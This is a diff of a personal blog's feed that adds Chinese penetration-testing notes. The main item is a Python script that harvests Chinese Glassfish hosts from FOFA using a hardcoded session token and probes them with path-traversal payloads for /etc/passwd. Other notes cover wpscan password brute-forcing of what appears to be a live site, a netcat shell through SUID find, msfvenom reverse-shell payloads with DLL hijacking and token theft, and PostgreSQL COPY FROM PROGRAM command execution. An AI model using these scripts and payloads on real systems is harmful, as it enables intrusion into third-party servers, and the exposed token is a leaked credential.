@@ -6,7 +6,7 @@
   <link href="https://github.com/chenchanghui/chenchanghui.github.io/atom.xml" rel="self"/>
   
   <link href="https://github.com/chenchanghui/chenchanghui.github.io/"/>
-  <updated>2021-10-09T07:38:39.768Z</updated>
+  <updated>2021-10-10T05:17:37.349Z</updated>
   <id>https://github.com/chenchanghui/chenchanghui.github.io/</id>
   
   <author>
@@ -17,11 +17,57 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>wpscan</title>
+    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/bbc010a7.html"/>
+    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/bbc010a7.html</id>
+    <published>2021-10-10T04:19:21.000Z</published>
+    <updated>2021-10-10T05:17:37.349Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ddd</p><p><img src="https://z3.ax1x.com/2021/10/10/5Al2FS.png"></p><p>开始扫描</p><p><img src="https://z3.ax1x.com/2021/10/10/5A1Nmq.png"></p><p>robots.txt爆出连个目录，但是/wp-admin/返回原网址，/wp-admin/admin-ajax.php返回0</p><p>两个都没有</p><p>xml-rpc漏洞，References: 下面列举出了一些漏洞详情网址，但是不太会用，主要是ddos，也有说有其他用途</p><p><a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner%EF%BC%9A">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner：</a></p><p><img src="https://z3.ax1x.com/2021/10/10/5A3t8e.png"></p><p>然后发现readme.html页面，没太大用</p><p>wp-cron，也是访问/wp-cron.php发起ddos攻击，没太大用</p><p><img src="https://z3.ax1x.com/2021/10/10/5A8BQJ.png"></p><p>发现使用的主题是hgsq，没有找到漏洞(The version could not be determined)</p><p><img src="https://z3.ax1x.com/2021/10/10/5A87wt.png"></p><p>自动枚举可能的漏洞，没有发现</p><p>接下来就爆用户名了</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爬出来50条这里就不写出来了</p><p>接下来就是爆密码</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -U username.txt -P password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆出来很多弱密码，就不写出来了</p><p>总结，kali的这个不知道怎么设置，–threads参数无效，–wordlist参数也说没有</p><pre class="line-numbers language-none"><code class="language-none">Scan Aborted: invalid option: -threadsScan Aborted: invalid option: -wordlist<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+    <category term="wpscan使用" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/wpscan%E4%BD%BF%E7%94%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>src edu extraction</title>
+    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/49262a27.html"/>
+    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/49262a27.html</id>
+    <published>2021-10-09T13:27:00.000Z</published>
+    <updated>2021-10-09T13:34:16.493Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>提取src.sjtu.edu.cn的漏洞数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url<span class="token operator">=</span><span class="token string">'https://src.sjtu.edu.cn/rank/firm/?province=9&amp;page='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        data<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content        <span class="token comment"># print(data)</span>        <span class="token comment"># print(data.decode('utf-8'))</span>        soup<span class="token operator">=</span>etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        result<span class="token operator">=</span>soup<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//td[@class="am-text-center"]/a/text()'</span><span class="token punctuation">)</span>        <span class="token comment"># print(result)</span>        results<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>        <span class="token comment"># print(results)</span>        resultss<span class="token operator">=</span>results<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#取空</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>resultss<span class="token punctuation">)</span>        <span class="token keyword">for</span> edu <span class="token keyword">in</span> resultss<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>edu<span class="token punctuation">)</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'src.txt'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>edu<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    yeshu<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'搜索的页数：'</span><span class="token punctuation">)</span>    src<span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+    <category term="数据提取" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96/"/>
+    
+    <category term="脚本" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E8%84%9A%E6%9C%AC/"/>
+    
+  </entry>
+  
+  <entry>
     <title>wpscan使用</title>
     <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/2b63819c.html"/>
     <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/2b63819c.html</id>
     <published>2021-10-09T07:21:54.000Z</published>
-    <updated>2021-10-09T07:38:39.768Z</updated>
+    <updated>2021-10-09T07:43:32.010Z</updated>
     
     <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ddd</p><p>kali版wpscan</p><p>安装</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/wpscanteam/wpscan.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新漏洞库</p><pre class="line-numbers language-none"><code class="language-none">wpscan --update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用</p><p>扫描站点</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>主题扫描</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url --enumerate twpscan --url url -e t#缩写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>插件扫描</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -e p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>主题/插件漏洞扫描</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -e vtwpscan --url url -e vp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>references后面显示的是漏洞详情网址，基本是配合msf漏洞利用模块</p><p>枚举用户名</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>暴力破解</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -U &lt;username路径或username&gt; -P &lt;password路径&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>听说可以–threads [线程数]设置线程，但是显示没这个选项，–wordlist选项也没，都是kail上的wpscan，其他系统上的还没试过</p>]]></content>
     
@@ -33,6 +79,8 @@
     
     
     
+    
+    <category term="wpscan" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/wpscan/"/>
     
   </entry>
   
@@ -101,6 +149,122 @@
     
     
     <category term="hello" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/hello/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Glassfish任意文件读取验证</title>
+    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/5a0d4ea.html"/>
+    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/5a0d4ea.html</id>
+    <published>2021-09-24T08:58:49.000Z</published>
+    <updated>2021-10-09T13:50:12.549Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Glassfish文件读取漏洞，fofa搜集，存在性验证</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token comment"># fofa搜索使用galssfish的ipdata</span><span class="token keyword">def</span> <span class="token function">fofa_search</span><span class="token punctuation">(</span>search_data<span class="token punctuation">,</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># search_data='"Glassfish" &amp;&amp; port="4848" &amp;&amp; country="CN"'</span>    <span class="token comment"># headers里设置cookie用于登录</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span>        <span class="token string">'cookie'</span><span class="token punctuation">:</span><span class="token string">'fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTEwODc2LCJtaWQiOjEwMDA2NjgxMywidXNlcm5hbWUiOiLlvqHngr3pm6oiLCJleHAiOjE2MzI0OTk4ODB9.ep72wJ_ObbZyti2tQSo9I5Ni4Fo5PhCgM5EuUJRyGvbmfBBIt9VDs31Dq8V4HqA4kXOenzDr0Rh4_2ICaWd-3Q'</span>    <span class="token punctuation">}</span>    <span class="token comment">#翻页搜索</span>    <span class="token keyword">for</span> yeshu <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>page<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 搜索字段需要base64编码才能拼接url</span>        search_data_bs <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>search_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>        url<span class="token operator">=</span><span class="token string">'https://fofa.so/result?qbase64='</span><span class="token operator">+</span>search_data_bs<span class="token operator">+</span><span class="token string">'&amp;page='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&amp;page_size=10'</span>        <span class="token comment">#print(urls)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在提取第'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'页'</span><span class="token punctuation">)</span>            result<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>content            <span class="token comment"># 构造xpath解析对象提取href字段</span>            soup<span class="token operator">=</span>etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>result<span class="token punctuation">)</span>            ip_data<span class="token operator">=</span>soup<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//span[@class="aSpan"]/a[@target="_blank"]/@href'</span><span class="token punctuation">)</span>            <span class="token comment"># 换行分隔</span>            ipdata<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ip_data<span class="token punctuation">)</span>            <span class="token comment"># 写进ip.txt文件</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'ip.txt'</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ipdata<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>   <span class="token comment"># 一个循环后在个换行符分隔</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token comment"># 验证vuln存在性</span><span class="token keyword">def</span> <span class="token function">check_vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload_linux<span class="token operator">=</span><span class="token string">'/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'</span>    payload_windows<span class="token operator">=</span><span class="token string">'/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'</span>    <span class="token keyword">for</span> ip <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'ip.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 提取一个ip后要把换行符去掉</span>        ip<span class="token operator">=</span>ip<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>        linux_url<span class="token operator">=</span>ip<span class="token operator">+</span>payload_linux        windows_url<span class="token operator">=</span>ip<span class="token operator">+</span>payload_windows        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># 检测状态码是否是200</span>            vuln_code_l<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>linux_url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code            vuln_code_w<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>windows_url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'check-&gt;'</span><span class="token operator">+</span>ip<span class="token punctuation">)</span>            <span class="token keyword">if</span> vuln_code_l<span class="token operator">==</span><span class="token number">200</span> <span class="token keyword">or</span> vuln_code_w<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">:</span>                <span class="token comment"># 写进vuln.txt文件</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'vuln.txt'</span><span class="token punctuation">,</span><span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>                    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># search=sys.argv[1]</span>    <span class="token comment"># page=sys.argv[2]</span>    search<span class="token operator">=</span><span class="token string">'"Glassfish" &amp;&amp; port="4848" &amp;&amp; country="CN"'</span>    page<span class="token operator">=</span><span class="token number">5</span>    fofa_search<span class="token punctuation">(</span>search<span class="token punctuation">,</span>page<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    check_vuln<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+    <category term="漏洞验证" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux提权</title>
+    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/e0f77580.html"/>
+    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/e0f77580.html</id>
+    <published>2021-09-22T13:08:02.000Z</published>
+    <updated>2021-10-09T13:28:36.295Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1 4个自动化脚本</p><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></p><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p><p>2 SUID提权</p><p>拿到webshell后，利用脚本或者手动探测是否有SUID</p><p>手工：</p><pre class="line-numbers language-none"><code class="language-none">find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} \;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Known Linux executables that can allow privilege escalation are:</p><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><p>如find：</p><pre class="line-numbers language-none"><code class="language-none">touch newfoldernamefind newfoldername -exec whoami \;返回root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>反弹shell：</p><pre class="line-numbers language-none"><code class="language-none">find newfoldername -exec nercat -lvp 5555 -e /bin/sh \;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">netcat ip port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接到打开的的端口将得到root shell</p><p>其他文件利用参考文档：<a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/linux/"/>
+    
+    <category term="提取" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%8F%90%E5%8F%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>烂土豆提权</title>
+    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/6f7ab96a.html"/>
+    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/6f7ab96a.html</id>
+    <published>2021-09-20T12:39:08.000Z</published>
+    <updated>2021-10-09T13:45:16.130Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1 烂土豆配合令牌窃取提权</p><p>下载烂土豆 exp，<a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p><p>上传网站</p><p>msfvenom生成木马反弹到msf</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将木马上传到网站，msf设置监听</p><pre class="line-numbers language-none"><code class="language-none">execute -cH -f ./potato.exeuse incognitolist_tokens -uimpersonate_token "NT AUTHORITY\\STSTEM"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2 dll劫持提权配合msf</p><p>原理：windows程序启动时需要dll。如果这些dll不存在，则可以通过在应用程序要查找的位置防止恶意dll来提权。</p><p>信息搜集，查看是否存在第三方软件</p><p>利用火绒剑可以查看进程</p><p><img src="https://z3.ax1x.com/2021/10/09/5kJcfU.png"></p><p><img src="https://z3.ax1x.com/2021/10/09/5kJvnA.png"></p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f dll &gt; libssl-1_1.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成dll后面并监听</p><p>用新生成的dll替换以前的，并启动第三方软件</p><p>msf可以监听到shell，在使用令牌窃取提权</p><p><img src="https://z3.ax1x.com/2021/10/09/5kYi9S.png"></p><p>缺点：要装有第三方软件<br>            能替换dll<br>            管理员要去运行这个程序</p><p>3 不带引号的服务路径配合msf，本地提权</p><p>原理：如果服务的路径未包含在引号内，则操作系统会执行找到的空格分隔符的服务路径的第一个实例</p><p>​        如cmd执行”C:\Program File\test.exe”，若未加引号执行C:\Prorgam，后面的File\test.exe会被当作参数</p><p>执行下面命令检测引号服务路径</p><pre class="line-numbers language-none"><code class="language-none">wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用路径制作文件上传</p><p>msf制作木马设置监听，启动服务</p><p>4 不安全的服务权限配合msf，本地提权</p><p>直接修改服务导致重定向文件</p><p>执行命令</p><pre class="line-numbers language-none"><code class="language-none">accesschk.exe -uwcqv "administrators" *检测服务权限配置(administrator，可以指定用户如user)sc config "NewServiceName" binpath="C:\Program.exe"将新建的服务重定向到指定目录下的文件sc start "NewServiceName"启动服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+    <category term="提权" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%8F%90%E6%9D%83/"/>
+    
+    <category term="烂土豆" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E7%83%82%E5%9C%9F%E8%B1%86/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>postgresql高级权限命令漏洞(CVE-2019-9193)</title>
+    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/8ac3ded4.html"/>
+    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/8ac3ded4.html</id>
+    <published>2021-09-20T06:15:33.000Z</published>
+    <updated>2021-10-09T13:40:53.168Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>进入对应目录：</p><pre class="line-numbers language-Cshell" data-language="Cshell"><code class="language-Cshell">cd postgresql/CVE-2019-9193/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动靶场：</p><pre class="line-numbers language-none"><code class="language-none">docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>navicat连接，账号/密码：postgres/postgres</p><p><img src="https://z3.ax1x.com/2021/10/09/5kG5i8.png"></p><p>ps：aliyun轻量应用服务器应该要在 安全-防火墙 中添加5432端口才能用外网访问</p><p>开了也不一定有用，试了好长时间，最后在碰运气再用navicat连接发现成功了</p><p>执行如下语句：</p><pre class="line-numbers language-none"><code class="language-none">DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'id';SELECT * FROM cmd_exec;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>FROm PROGRAM将执行命令 id 并将结果保存在cmd_exec表中：</p><p><img src="https://z3.ax1x.com/2021/10/09/5kGxiT.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+    <category term="postgresql" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/postgresql/"/>
+    
+    <category term="提权" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%8F%90%E6%9D%83/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>aliyun docker镜像安装vulhub</title>
+    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/a0bfa72d.html"/>
+    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/a0bfa72d.html</id>
+    <published>2021-09-19T14:58:31.000Z</published>
+    <updated>2021-10-09T12:54:51.313Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1 先安装docker-compose(root权限)：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl -L "https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chmod +x /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试是否安装成功：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker-compose --versiondocker-compose version 1.24.1, build 4667896b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2 安装git</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install -y git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3 下载vulhub</p><pre class="line-numbers language-shell" 